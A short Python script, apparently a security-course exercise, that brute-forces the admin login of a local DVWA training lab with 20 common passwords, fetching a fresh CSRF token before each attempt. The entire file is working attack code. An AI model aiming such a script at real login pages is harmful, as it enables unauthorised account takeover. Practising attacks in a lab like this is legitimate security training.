import requests
from bs4 import BeautifulSoup

# my full name to include in the output
my_name = "Mohamed Magdy Nayel"

# url of the login page
login_url = "http://127.0.0.1/dvwa/login.php"

# username for attacking login page
username = "admin"

# predefined list of 20 common passwords
password_list = [
    "123456",
    "admin",
    "Admin123",
    "12345678",
    "123456789",
    "1234",
    "qwerty",
    "letmein",
    "111111",
    "1234567890",
    "football",
    "iloveyou",
    "welcome",
    "666666",
    "Password",
    "password",
    "1231231",
    "12345678910",
    "abc123",
    "passw0rd",
]

# create a session to persist cookies
session = requests.Session()

# loop through each password in the list
for password in password_list:

    # get CSRF token from the login page
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "user_token"})["value"]

    # the login parameters including the token
    payload = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": csrf_token,
    }

    # login with post request
    response = session.post(login_url, data=payload)

    # analayzing the response code to identify success and failed
    # print("response code: ", response.text)

    # check the response to determine if login was successful
    if "You have logged in" in response.text:
        print(
            f"\033[32mTrying '{password}' for user 'admin' ({my_name}) Success\033[0m"
        )
        break
    elif "Login failed" in response.text:
        print(
            f"\033[31mTrying '{password}' Against User 'admin' ({my_name}) failed\033[0m"
        )
